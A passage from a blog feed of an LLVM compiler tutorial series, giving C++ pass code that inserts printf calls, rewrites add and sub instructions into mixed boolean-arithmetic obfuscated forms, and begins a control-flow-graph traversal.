calls"/><published>2024-04-24T05:24:00+00:00</published><updated>2024-04-24T05:24:00+00:00</updated><id>https://dalnaracrater.github.io/blog/2024/003-Insert_func_call</id><content type="html" xml:base="https://dalnaracrater.github.io/blog/2024/003-Insert_func_call/"><![CDATA[ <h3 id="learning-objectives">Learning Objectives</h3> <ul> <li>learn how a function is called in a memory</li> <li>learn how to generate function call with parameters</li> </ul> <h3 id="how-do-cpucompiler-call-a-function">How do CPU/compiler call a function?</h3> <h4 id="printf">printf</h4> <h3 id="insert-function-call">Insert function call</h3> <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">"llvm/Pass.h"</span><span class="cp">
#include</span> <span class="cpf">"llvm/IR/Function.h"</span><span class="cp">
#include</span> <span class="cpf">"llvm/IR/BasicBlock.h"</span><span class="cp">
#include</span> <span class="cpf">"llvm/IR/IRBuilder.h"</span><span class="cp">
</span>
<span class="cp">#include</span> <span class="cpf">"llvm/Support/raw_ostream.h"</span><span class="cp">
</span>
<span class="cp">#include</span> <span class="cpf">"llvm/IR/Module.h"</span><span class="cp">
</span>
<span class="k">using</span> <span class="k">namespace</span> <span class="n">llvm</span><span class="p">;</span>

<span class="k">namespace</span> <span class="p">{</span>
    <span class="k">struct</span> <span class="nc">YJ005InjectFuncCall</span> <span class="o">:</span> <span class="k">public</span> <span class="n">ModulePass</span> <span class="p">{</span>
        <span class="k">static</span> <span class="kt">char</span> <span class="n">ID</span><span class="p">;</span>
        <span class="n">YJ005InjectFuncCall</span><span class="p">()</span> <span class="o">:</span> <span class="n">ModulePass</span><span class="p">(</span><span class="n">ID</span><span class="p">){}</span>

        <span class="kt">bool</span> <span class="nf">runOnModule</span><span class="p">(</span><span class="n">Module</span> <span class="o">&amp;</span><span class="n">M</span><span class="p">)</span> <span class="k">override</span><span class="p">{</span>
            <span class="n">LLVMContext</span> <span class="o">&amp;</span> <span class="n">context</span> <span class="o">=</span> <span class="n">M</span><span class="p">.</span><span class="n">getContext</span><span class="p">();</span>

            <span class="c1">// creating a pointer Int8 type</span>
            <span class="n">PointerType</span> <span class="o">*</span><span class="n">PrintfArgTy</span> <span class="o">=</span> <span class="n">PointerType</span><span class="o">::</span><span class="n">getUnqual</span><span class="p">(</span><span class="n">Type</span><span class="o">::</span><span class="n">getInt8Ty</span><span class="p">(</span><span class="n">context</span><span class="p">));</span>

            <span class="c1">// step1: Inject declaration of printf</span>
            <span class="n">FunctionType</span> <span class="o">*</span><span class="n">PrintfTy</span> <span class="o">=</span> <span class="n">FunctionType</span><span class="o">::</span><span class="n">get</span><span class="p">(</span>
                <span class="n">IntegerType</span><span class="o">::</span><span class="n">getInt32Ty</span><span class="p">(</span><span class="n">context</span><span class="p">),</span>
                <span class="n">PrintfArgTy</span><span class="p">,</span>
                <span class="nb">true</span><span class="c1">// variadic</span>
            <span class="p">);</span>

            <span class="n">FunctionCallee</span> <span class="n">Printf</span> <span class="o">=</span> <span class="n">M</span><span class="p">.</span><span class="n">getOrInsertFunction</span><span class="p">(</span><span class="s">"printf"</span><span class="p">,</span> <span class="n">PrintfTy</span><span class="p">);</span>

            <span class="n">Function</span> <span class="o">*</span><span class="n">PrintfF</span> <span class="o">=</span> <span class="n">dyn_cast</span><span class="o">&lt;</span><span class="n">Function</span><span class="o">&gt;</span><span class="p">(</span><span class="n">Printf</span><span class="p">.</span><span class="n">getCallee</span><span class="p">());</span>
            <span class="n">PrintfF</span><span class="o">-&gt;</span><span class="n">setDoesNotThrow</span><span class="p">();</span>
            <span class="n">PrintfF</span><span class="o">-&gt;</span><span class="n">addParamAttr</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">Attribute</span><span class="o">::</span><span class="n">NoCapture</span><span class="p">);</span>
            <span class="n">PrintfF</span><span class="o">-&gt;</span><span class="n">addParamAttr</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">Attribute</span><span class="o">::</span><span class="n">ReadOnly</span><span class="p">);</span>

            <span class="c1">// step2: Inject global variable that will hold the printf format string</span>
            <span class="n">Constant</span> <span class="o">*</span><span class="n">PrintfFormatStr</span> <span class="o">=</span> <span class="n">ConstantDataArray</span><span class="o">::</span><span class="n">getString</span><span class="p">(</span>
                <span class="n">context</span><span class="p">,</span> <span class="s">"Function is %s, num of arg: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

            <span class="n">Constant</span> <span class="o">*</span><span class="n">PrintfFormatStrVar</span> <span class="o">=</span> <span class="n">M</span><span class="p">.</span><span class="n">getOrInsertGlobal</span><span class="p">(</span><span class="s">"PrintfFormatStr"</span><span class="p">,</span> <span class="n">PrintfFormatStr</span><span class="o">-&gt;</span><span class="n">getType</span><span class="p">());</span>
            <span class="n">dyn_cast</span><span class="o">&lt;</span><span class="n">GlobalVariable</span><span class="o">&gt;</span><span class="p">(</span><span class="n">PrintfFormatStrVar</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">setInitializer</span><span class="p">(</span><span class="n">PrintfFormatStr</span><span class="p">);</span>

            <span class="c1">// GlobalVariable *PrintfFormatStrVar = new GlobalVariable(M, PrintfFormatStr-&gt;getType(), true, // isConstant</span>
            <span class="c1">//     GlobalValue::PrivateLinkage, PrintfFormatStr, "PrintfFormatStr");</span>

            <span class="kt">bool</span> <span class="n">modified</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
            <span class="c1">// step3: for each function in the module, inject a call to printf</span>
            <span class="k">for</span><span class="p">(</span><span class="k">auto</span><span class="o">&amp;</span> <span class="n">F</span> <span class="o">:</span> <span class="n">M</span><span class="p">){</span>
                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">F</span><span class="p">.</span><span class="n">isDeclaration</span><span class="p">()){</span>
                    <span class="c1">// errs() &lt;&lt; &amp;*F.getEntryBlock().getFirstInsertionPt();</span>

                    <span class="n">IRBuilder</span><span class="o">&lt;&gt;</span> <span class="n">Builder</span><span class="p">(</span><span class="o">&amp;*</span><span class="n">F</span><span class="p">.</span><span class="n">getEntryBlock</span><span class="p">().</span><span class="n">getFirstInsertionPt</span><span class="p">());</span>

                    <span class="n">Value</span> <span class="o">*</span><span class="n">FormatStrPtr</span> <span class="o">=</span> <span class="n">Builder</span><span class="p">.</span><span class="n">CreatePointerCast</span><span class="p">(</span><span class="n">PrintfFormatStrVar</span><span class="p">,</span> <span class="n">PrintfArgTy</span><span class="p">,</span> <span class="s">"formatStr"</span><span class="p">);</span>

                    <span class="k">auto</span> <span class="n">funcName</span> <span class="o">=</span> <span class="n">Builder</span><span class="p">.</span><span class="n">CreateGlobalStringPtr</span><span class="p">(</span><span class="n">F</span><span class="p">.</span><span class="n">getName</span><span class="p">());</span>
                    
                    <span class="c1">// errs() &lt;&lt; F.getName() &lt;&lt; ' ' &lt;&lt; Builder.getInt32(F.arg_size()) &lt;&lt; " " &lt;&lt; F.arg_size() &lt;&lt; '\n';</span>

                    <span class="n">Builder</span><span class="p">.</span><span class="n">CreateCall</span><span class="p">(</span><span class="n">Printf</span><span class="p">,</span> <span class="p">{</span><span class="n">FormatStrPtr</span><span class="p">,</span> <span class="n">funcName</span><span class="p">,</span> <span class="n">Builder</span><span class="p">.</span><span class="n">getInt32</span><span class="p">(</span><span class="n">F</span><span class="p">.</span><span class="n">arg_size</span><span class="p">())});</span>
                <span class="p">}</span>


                <span class="k">for</span><span class="p">(</span><span class="k">auto</span><span class="o">&amp;</span> <span class="n">BB</span><span class="o">:</span> <span class="n">F</span><span class="p">){</span>
                    <span class="k">for</span><span class="p">(</span><span class="k">auto</span><span class="o">&amp;</span> <span class="n">I</span><span class="o">:</span> <span class="n">BB</span><span class="p">){</span>
                        <span class="c1">// errs() &lt;&lt; I &lt;&lt; '\n';</span>
                    <span class="p">}</span>
                <span class="p">}</span>

                <span class="n">modified</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="k">return</span> <span class="n">modified</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">};</span>
<span class="p">}</span>

<span class="kt">char</span> <span class="n">YJ005InjectFuncCall</span><span class="o">::</span><span class="n">ID</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="k">static</span> <span class="n">RegisterPass</span><span class="o">&lt;</span><span class="n">YJ005InjectFuncCall</span><span class="o">&gt;</span> <span class="n">X</span><span class="p">(</span><span class="s">"InjectFunc"</span><span class="p">,</span> <span class="s">"Inject function call"</span><span class="p">,</span> <span class="nb">false</span><span class="p">,</span> <span class="nb">true</span><span class="p">);</span>

</code></pre></div></div> <table> <thead> <tr> <th>Pass</th> <th>Type</th> </tr> </thead> <tbody> <tr> <td><a href="../000-Begining_LLVM(KOR)">Writing HelloLLVM Pass</a></td> <td>analysis</td> </tr> <tr> <td><a href="../Iterating_over_Module_Function_BasicBlock">Iterating over Module, Function, Basic block</a></td> <td>analysis</td> </tr> <tr> <td><a href="../002-Count_insts_calls">Count the number of insts, func calls</a></td> <td>analysis</td> </tr> <tr> <td><a href="../003-Insert_func_call">Insert func call</a></td> <td>transformation</td> </tr> <tr> <td><a href="../004-Change_Insts_(obfuscation)">Change Insts (obfuscation)</a></td> <td>transformation</td> </tr> <tr> <td><a href="../005-Traverse_CFG">Control flow graph</a></td> <td>transformation</td> </tr> </tbody> </table> <h4 id="did-you-enjoy-the-llvm-tutorial-now-its-time-to-study-program-analysis-here">Did you enjoy the LLVM tutorial? Now it’s time to study <strong>program analysis</strong>. <a href="./2024-03-14-101-Program_analysis_with_LLVM%20copy.md">here!</a></h4> <h2 id="reference">Reference</h2> <p>[1] Andrzej Warzyński. llvm-tutor. <a href="https://github.com/banach-space/llvm-tutor">github</a><br/> [2] Adrian Sampson. LLVM for Grad Students. <a href="https://www.cs.cornell.edu/~asampson/blog/llvm.html">blog</a><br/> [3] Keshav Pingali. CS 380C: Advanced Topics in Compilers. <a href="https://www.cs.utexas.edu/~pingali/CS380C/2020/assignments/assignment4/index.html">blog</a><br/> [4] Arthur Eubanks. The New Pass Manager. <a href="https://blog.llvm.org/posts/2021-03-26-the-new-pass-manager">blog</a></p>]]></content><author><name></name></author><category term="LLVM"/><summary type="html"><![CDATA[LLVM]]></summary></entry><entry><title type="html">004 Change Instructions (obfuscation)</title><link href="https://dalnaracrater.github.io/blog/2024/004-Change_Insts_(obfuscation)/" rel="alternate" type="text/html" title="004 Change Instructions (obfuscation)"/><published>2024-04-24T05:24:00+00:00</published><updated>2024-04-24T05:24:00+00:00</updated><id>https://dalnaracrater.github.io/blog/2024/004-Change_Insts_(obfuscation)</id><content type="html" xml:base="https://dalnaracrater.github.io/blog/2024/004-Change_Insts_(obfuscation)/"><![CDATA[ <p><em>본 튜토리얼에서는 프로그램 분석 기법을 LLVM을 통해 구현해보는 것이 목적이기 때문에 모든 이론적 지식을 자세하게 다루지는 않을 것이다.</em></p> <h3 id="learning-objectives">Learning Objectives</h3> <ul> <li>learn a definition of obfuscation</li> <li>learn obfuscation technuques</li> <li>learn how to change instructions</li> </ul> <h2 id="what-is-obfuscation">What is obfuscation?</h2> <h2 id="how-can-we-change-instructions">How can we change instructions?</h2> <h2 id="implementation">implementation</h2> <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">"llvm/Pass.h"</span><span class="cp">
#include</span> <span class="cpf">"llvm/IR/Function.h"</span><span class="cp">
#include</span> <span class="cpf">"llvm/IR/BasicBlock.h"</span><span class="cp">
#include</span> <span class="cpf">"llvm/IR/Instruction.h"</span><span class="cp">
#include</span> <span class="cpf">"llvm/Transforms/Utils/BasicBlockUtils.h"</span><span class="cp">
#include</span> <span class="cpf">"llvm/IR/IRBuilder.h"</span><span class="cp">
</span>
<span class="k">using</span> <span class="k">namespace</span> <span class="n">llvm</span><span class="p">;</span>

<span class="k">namespace</span><span class="p">{</span>
    <span class="k">struct</span> <span class="nc">YJ008MbaAdd</span> <span class="o">:</span> <span class="k">public</span> <span class="n">FunctionPass</span><span class="p">{</span>
        <span class="k">static</span> <span class="kt">char</span> <span class="n">ID</span><span class="p">;</span>
        <span class="n">YJ008MbaAdd</span><span class="p">()</span> <span class="o">:</span> <span class="n">FunctionPass</span><span class="p">(</span><span class="n">ID</span><span class="p">){};</span>

        <span class="kt">bool</span> <span class="n">runOnFunction</span><span class="p">(</span><span class="n">Function</span><span class="o">&amp;</span> <span class="n">F</span><span class="p">)</span> <span class="k">override</span> <span class="p">{</span>
            <span class="kt">bool</span> <span class="n">isModified</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>

            <span class="k">for</span><span class="p">(</span><span class="k">auto</span><span class="o">&amp;</span> <span class="n">BB</span><span class="o">:</span> <span class="n">F</span><span class="p">){</span>

                <span class="k">for</span><span class="p">(</span><span class="k">auto</span> <span class="n">I</span> <span class="o">=</span> <span class="n">BB</span><span class="p">.</span><span class="n">begin</span><span class="p">();</span> <span class="n">I</span> <span class="o">!=</span> <span class="n">BB</span><span class="p">.</span><span class="n">end</span><span class="p">();</span> <span class="o">++</span><span class="n">I</span><span class="p">){</span>
                    <span class="k">auto</span> <span class="o">*</span><span class="n">op</span> <span class="o">=</span> <span class="n">dyn_cast</span><span class="o">&lt;</span><span class="n">BinaryOperator</span><span class="o">&gt;</span><span class="p">(</span><span class="n">I</span><span class="p">);</span>

                    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">op</span><span class="p">)</span> <span class="k">continue</span><span class="p">;</span>

                    <span class="k">if</span> <span class="p">(</span><span class="n">op</span><span class="o">-&gt;</span><span class="n">getOpcode</span><span class="p">()</span> <span class="o">!=</span> <span class="n">Instruction</span><span class="o">::</span><span class="n">Add</span> <span class="o">||</span> <span class="o">!</span><span class="n">op</span><span class="o">-&gt;</span><span class="n">getType</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">isIntegerTy</span><span class="p">())</span>
                        <span class="k">continue</span><span class="p">;</span>
                    
                    <span class="n">IRBuilder</span><span class="o">&lt;&gt;</span> <span class="n">Builder</span><span class="p">(</span><span class="n">op</span><span class="p">);</span>
                    <span class="c1">//a + b == (((a ^ b) + 2 * (a &amp; b)) * 39 + 23) * 151 + 111</span>
                    <span class="n">Instruction</span><span class="o">*</span> <span class="n">v</span> <span class="o">=</span> <span class="n">BinaryOperator</span><span class="o">::</span><span class="n">CreateAdd</span><span class="p">(</span><span class="n">Builder</span><span class="p">.</span><span class="n">CreateMul</span><span class="p">(</span>
                                                            <span class="n">Builder</span><span class="p">.</span><span class="n">CreateAdd</span><span class="p">(</span><span class="n">Builder</span><span class="p">.</span><span class="n">CreateXor</span><span class="p">(</span><span class="n">op</span><span class="o">-&gt;</span><span class="n">getOperand</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">op</span><span class="o">-&gt;</span><span class="n">getOperand</span><span class="p">(</span><span class="mi">1</span><span class="p">)),</span>
                                                                <span class="n">Builder</span><span class="p">.</span><span class="n">CreateAdd</span><span class="p">(</span><span class="n">Builder</span><span class="p">.</span><span class="n">CreateMul</span><span class="p">(</span><span class="n">ConstantInt</span><span class="o">::</span><span class="n">get</span><span class="p">(</span><span class="n">op</span><span class="o">-&gt;</span><span class="n">getType</span><span class="p">(),</span> <span class="mi">2</span><span class="p">),</span>
                                                                                    <span class="n">Builder</span><span class="p">.</span><span class="n">CreateMul</span><span class="p">(</span><span class="n">Builder</span><span class="p">.</span><span class="n">CreateAnd</span><span class="p">(</span><span class="n">op</span><span class="o">-&gt;</span><span class="n">getOperand</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">op</span><span class="o">-&gt;</span><span class="n">getOperand</span><span class="p">(</span><span class="mi">1</span><span class="p">)),</span>
                                                                                <span class="n">ConstantInt</span><span class="o">::</span><span class="n">get</span><span class="p">(</span><span class="n">op</span><span class="o">-&gt;</span><span class="n">getType</span><span class="p">(),</span> <span class="mi">39</span><span class="p">))),</span>
                                                                    <span class="n">ConstantInt</span><span class="o">::</span><span class="n">get</span><span class="p">(</span><span class="n">op</span><span class="o">-&gt;</span><span class="n">getType</span><span class="p">(),</span> <span class="mi">23</span><span class="p">))),</span>
                                                            <span class="n">ConstantInt</span><span class="o">::</span><span class="n">get</span><span class="p">(</span><span class="n">op</span><span class="o">-&gt;</span><span class="n">getType</span><span class="p">(),</span> <span class="mi">151</span><span class="p">)),</span>
                                                        <span class="n">ConstantInt</span><span class="o">::</span><span class="n">get</span><span class="p">(</span><span class="n">op</span><span class="o">-&gt;</span><span class="n">getType</span><span class="p">(),</span> <span class="mi">111</span><span class="p">));</span>
                    
                    <span class="n">ReplaceInstWithInst</span><span class="p">(</span><span class="n">op</span><span class="o">-&gt;</span><span class="n">getParent</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">getInstList</span><span class="p">(),</span> <span class="n">I</span><span class="p">,</span> <span class="n">v</span><span class="p">);</span>

                    <span class="n">isModified</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
                <span class="p">}</span>

            <span class="p">}</span>

            <span class="k">return</span> <span class="n">isModified</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">};</span>
<span class="p">}</span>

<span class="kt">char</span> <span class="n">YJ008MbaAdd</span><span class="o">::</span><span class="n">ID</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="k">static</span> <span class="n">RegisterPass</span><span class="o">&lt;</span><span class="n">YJ008MbaAdd</span><span class="o">&gt;</span><span class="n">X</span> <span class="p">(</span><span class="s">"MbaAdd"</span><span class="p">,</span> <span class="s">"Replace add with MBA add"</span><span class="p">,</span> <span class="nb">false</span><span class="p">,</span> <span class="nb">true</span><span class="p">);</span>
</code></pre></div></div> <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">"llvm/Pass.h"</span><span class="cp">
#include</span> <span class="cpf">"llvm/IR/Function.h"</span><span class="cp">
#include</span> <span class="cpf">"llvm/IR/Instruction.h"</span><span class="cp">
#include</span> <span class="cpf">"llvm/IR/IRBuilder.h"</span><span class="cp">
#include</span> <span class="cpf">"llvm/Transforms/Utils/BasicBlockUtils.h"</span><span class="cp">
</span>
<span class="cp">#include</span> <span class="cpf">"llvm/Support/raw_ostream.h"</span><span class="cp">
</span>
<span class="k">using</span> <span class="k">namespace</span> <span class="n">llvm</span><span class="p">;</span>

<span class="k">namespace</span><span class="p">{</span>
    <span class="k">struct</span> <span class="nc">YJ008MbaSub</span> <span class="o">:</span> <span class="k">public</span> <span class="n">FunctionPass</span><span class="p">{</span>
        <span class="k">static</span> <span class="kt">char</span> <span class="n">ID</span><span class="p">;</span>
        <span class="n">YJ008MbaSub</span><span class="p">()</span> <span class="o">:</span> <span class="n">FunctionPass</span><span class="p">(</span><span class="n">ID</span><span class="p">){}</span>

        <span class="kt">bool</span> <span class="n">runOnFunction</span><span class="p">(</span><span class="n">Function</span><span class="o">&amp;</span> <span class="n">F</span><span class="p">)</span> <span class="k">override</span> <span class="p">{</span>
            <span class="kt">bool</span> <span class="n">isModified</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
            <span class="k">for</span><span class="p">(</span><span class="k">auto</span><span class="o">&amp;</span> <span class="n">BB</span> <span class="o">:</span> <span class="n">F</span><span class="p">){</span>
                
                <span class="k">for</span><span class="p">(</span><span class="k">auto</span> <span class="n">I</span> <span class="o">=</span> <span class="n">BB</span><span class="p">.</span><span class="n">begin</span><span class="p">();</span> <span class="n">I</span> <span class="o">!=</span> <span class="n">BB</span><span class="p">.</span><span class="n">end</span><span class="p">();</span> <span class="o">++</span><span class="n">I</span><span class="p">){</span>
                    <span class="c1">// errs() &lt;&lt; I &lt;&lt; '\n';</span>
                    <span class="k">auto</span> <span class="o">*</span><span class="n">op</span> <span class="o">=</span> <span class="n">dyn_cast</span><span class="o">&lt;</span><span class="n">BinaryOperator</span><span class="o">&gt;</span><span class="p">(</span><span class="n">I</span><span class="p">);</span>
                    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">op</span><span class="p">)</span> <span class="k">continue</span><span class="p">;</span>

                    <span class="c1">// skip inst if opcode is not Sub or of Integer type</span>
                    <span class="kt">unsigned</span> <span class="n">opcode</span> <span class="o">=</span> <span class="n">op</span><span class="o">-&gt;</span><span class="n">getOpcode</span><span class="p">();</span>
                    <span class="k">if</span> <span class="p">(</span><span class="n">opcode</span> <span class="o">!=</span> <span class="n">Instruction</span><span class="o">::</span><span class="n">Sub</span> <span class="o">||</span> <span class="o">!</span><span class="n">op</span><span class="o">-&gt;</span><span class="n">getType</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">isIntegerTy</span><span class="p">())</span> <span class="k">continue</span><span class="p">;</span>

                    <span class="n">IRBuilder</span><span class="o">&lt;&gt;</span> <span class="n">Builder</span><span class="p">(</span><span class="n">op</span><span class="p">);</span>
                    <span class="c1">// create inst: (a + ~b) + 1</span>
                    <span class="n">Instruction</span> <span class="o">*</span><span class="n">v</span> <span class="o">=</span> <span class="n">BinaryOperator</span><span class="o">::</span><span class="n">CreateAdd</span><span class="p">(</span>
                        <span class="n">Builder</span><span class="p">.</span><span class="n">CreateAdd</span><span class="p">(</span><span class="n">op</span><span class="o">-&gt;</span><span class="n">getOperand</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">Builder</span><span class="p">.</span><span class="n">CreateNot</span><span class="p">(</span><span class="n">op</span><span class="o">-&gt;</span><span class="n">getOperand</span><span class="p">(</span><span class="mi">1</span><span class="p">))),</span>
                        <span class="n">ConstantInt</span><span class="o">::</span><span class="n">get</span><span class="p">(</span><span class="n">op</span><span class="o">-&gt;</span><span class="n">getType</span><span class="p">(),</span> <span class="mi">1</span><span class="p">));</span>

                    <span class="n">errs</span><span class="p">()</span> <span class="o">&lt;&lt;</span> <span class="n">op</span> <span class="o">&lt;&lt;</span> <span class="sc">'\n'</span><span class="p">;</span>

                    <span class="c1">// replace inst sub -&gt; (a + ~b) + 1</span>
                    <span class="n">ReplaceInstWithInst</span><span class="p">(</span><span class="n">op</span><span class="o">-&gt;</span><span class="n">getParent</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">getInstList</span><span class="p">(),</span> <span class="n">I</span><span class="p">,</span> <span class="n">v</span><span class="p">);</span>
                    <span class="c1">// errs() &lt;&lt; "HI";</span>

                    <span class="n">isModified</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
                <span class="p">}</span>
            <span class="p">}</span>

            <span class="k">return</span> <span class="n">isModified</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">};</span>
<span class="p">}</span>

<span class="kt">char</span> <span class="n">YJ008MbaSub</span><span class="o">::</span><span class="n">ID</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="k">static</span> <span class="n">RegisterPass</span><span class="o">&lt;</span><span class="n">YJ008MbaSub</span><span class="o">&gt;</span><span class="n">X</span><span class="p">(</span><span class="s">"MbaSub"</span><span class="p">,</span> <span class="s">"replace Sub with Mab"</span><span class="p">,</span> <span class="nb">false</span><span class="p">,</span> <span class="nb">true</span><span class="p">);</span>
</code></pre></div></div> <table> <thead> <tr> <th>Pass</th> <th>Type</th> </tr> </thead> <tbody> <tr> <td><a href="../000-Begining_LLVM(KOR)">Writing HelloLLVM Pass</a></td> <td>analysis</td> </tr> <tr> <td><a href="../Iterating_over_Module_Function_BasicBlock">Iterating over Module, Function, Basic block</a></td> <td>analysis</td> </tr> <tr> <td><a href="../002-Count_insts_calls">Count the number of insts, func calls</a></td> <td>analysis</td> </tr> <tr> <td><a href="../003-Insert_func_call">Insert func call</a></td> <td>transformation</td> </tr> <tr> <td><a href="../004-Change_Insts_(obfuscation)">Change Insts (obfuscation)</a></td> <td>transformation</td> </tr> <tr> <td><a href="../005-Traverse_CFG">Control flow graph</a></td> <td>transformation</td> </tr> </tbody> </table> <h2 id="reference">Reference</h2> <p>[1] Andrzej Warzyński. llvm-tutor. <a href="https://github.com/banach-space/llvm-tutor">github</a><br/> [2] Adrian Sampson. LLVM for Grad Students. <a href="https://www.cs.cornell.edu/~asampson/blog/llvm.html">blog</a><br/> [3] Keshav Pingali. CS 380C: Advanced Topics in Compilers. <a href="https://www.cs.utexas.edu/~pingali/CS380C/2020/assignments/assignment4/index.html">blog</a><br/> [4] Arthur Eubanks. The New Pass Manager. <a href="https://blog.llvm.org/posts/2021-03-26-the-new-pass-manager">blog</a></p>]]></content><author><name></name></author><category term="LLVM"/><summary type="html"><![CDATA[LLVM]]></summary></entry><entry><title type="html">005 Traverse Control flow graph</title><link href="https://dalnaracrater.github.io/blog/2024/005-Traverse_CFG/" rel="alternate" type="text/html" title="005 Traverse Control flow graph"/><published>2024-04-24T05:24:00+00:00</published><updated>2024-04-24T05:24:00+00:00</updated><id>https://dalnaracrater.github.io/blog/2024/005-Traverse_CFG</id><content type="html" xml:base="https://dalnaracrater.github.io/blog/2024/005-Traverse_CFG/"><![CDATA[ <h2 id="learning-objectives">Learning Objectives</h2> <ul> <li>learn how to traverse graph structure</li> <li>review SSA and Phi function</li> </ul> <p>Traversing a Control Flow Graph(CFG) is a fundamental method in compiler optimization and program analysis.</p> <div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">"llvm/Pass.h"</span><span class="cp">
#include</span> <span class="cpf">"llvm/IR/Function.h"</span><span class="cp">
#include</span> <span class="cpf">"llvm/IR/BasicBlock.h"</span><span class="cp">
#include</span> <span class="cpf">"llvm/IR/Dominators.h"</span><span class="cp">
</span>
<span class="cp">#include</span> <span class="cpf">"llvm/ADT/MapVector.h"</span><span class="cp">
#include</span> <span class="cpf">"llvm/ADT/SmallPtrSet.h"</span><span class="cp">
</span>
<span class="cp">#include</span> <span class="cpf">"llvm/Support/raw_ostream.h"</span><span class="cp">
</span>
<span class="cp">#include</span> <span class="cpf">&lt;unordered_map&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stack&gt;</span><span class="cp">
</span>
<span class="k">using</span> <span class="k">namespace</span> <span class="n">llvm</span><span class="p">;</span>

<span class="k">namespace</span><span class="p">{</span>
    <span class="k">struct</span> <span class="nc">YJ009RIV</span> <span class="o">:</span> <span class="k">public</span> <span class="n">FunctionPass</span><span class="p">{</span>
        <span class="c1">// Map values with addr of BB</span>
        <span class="k">using</span> <span class="n">MapVecBlk</span> <span class="o">=</span> <span class="n">MapVector</span><span class="o">&lt;</span><span class="n">BasicBlock</span> <span class="k">const</span> <span class="o">*</span><span class="p">,</span> <span class="n">SmallPtrSet</span><span class="o">&lt;</span><span class="n">Value</span> <span class="o">*</span><span class="p">,</span> <span class="mi">8</span><span class="o">&gt;&gt;</span><span class="p">;</span>
        <span class="k">using</span> <span class="n">NodeTy</span> <span class="o">=</span> <span class="n">DomTreeNodeBase</span><span class="o">&lt;</span><span class="n">BasicBlock</span><span class="o">&gt;</span> <span class="o">*</span><span class="p">;</span>

        <span class="n">MapVecBlk</span> <span class="n">result</span><span class="p">;</span>

        <span class="k">static</span> <span class="kt">char</span> <span class="n">ID</span><span class="p">;</span>
        <span class="n">YJ009RIV</span><span class="p">()</span> <span class="o">:</span> <span class="n">FunctionPass</span><span class="p">(</span><span class="n">ID</span><span class="p">)</span> <span class="p">{}</span>

        <span class="n">MapVecBlk</span> <span class="nf">buildRIV</span><span class="p">(</span><span class="n">llvm</span><span class="o">::</span><span class="n">Function</span> <span class="o">&amp;</span><span class="n">F</span><span class="p">,</span> <span class="n">llvm</span><span class="o">::</span><span class="n">DomTreeNodeBase</span><span class="o">&lt;</span><span class="n">llvm</span><span class="o">::</span><span class="n">BasicBlock</span><span class="o">&gt;</span> <span class="o">*</span><span class="n">CFGRoot</span><span class="p">){</span>
            <span class="c1">// DominatorTree *DT; //FunctionAnalysisManager.getResult&lt;DominatroTreeAnalytsis&gt;(F);</span>
            <span class="c1">// NodeTy CFGRoot = DT-&gt;getRootNode();</span>
 
            <span class="n">MapVecBlk</span> <span class="n">definedVarMap</span><span class="p">;</span>
            <span class="c1">// for each basic block, map defined variables</span>
            <span class="k">for</span><span class="p">(</span><span class="k">auto</span><span class="o">&amp;</span> <span class="n">BB</span><span class="o">:</span> <span class="n">F</span><span class="p">){</span>
                <span class="k">auto</span> <span class="o">&amp;</span><span class="n">Values</span> <span class="o">=</span> <span class="n">definedVarMap</span><span class="p">[</span><span class="o">&amp;</span><span class="n">BB</span><span class="p">];</span>
                <span class="k">for</span><span class="p">(</span><span class="k">auto</span><span class="o">&amp;</span> <span class="n">I</span><span class="o">:</span> <span class="n">BB</span><span class="p">)</span>
                    <span class="k">if</span> <span class="p">(</span><span class="n">I</span><span class="p">.</span><span class="n">getType</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">isIntegerTy</span><span class="p">())</span>
                        <span class="n">Values</span><span class="p">.</span><span class="n">insert</span><span class="p">(</span><span class="o">&amp;</span><span class="n">I</span><span class="p">);</span>
            <span class="p">}</span>

            <span class="k">auto</span><span class="o">&amp;</span> <span class="n">EntryBBValues</span> <span class="o">=</span> <span class="n">result</span><span class="p">[</span><span class="o">&amp;</span><span class="n">F</span><span class="p">.</span><span class="n">getEntryBlock</span><span class="p">()];</span>

            <span class="k">for</span><span class="p">(</span><span class="k">auto</span><span class="o">&amp;</span> <span class="n">Global</span> <span class="o">:</span> <span class="n">F</span><span class="p">.</span><span class="n">getParent</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">globals</span><span class="p">())</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">Global</span><span class="p">.</span><span class="n">getValueType</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">isIntegerTy</span><span class="p">())</span>
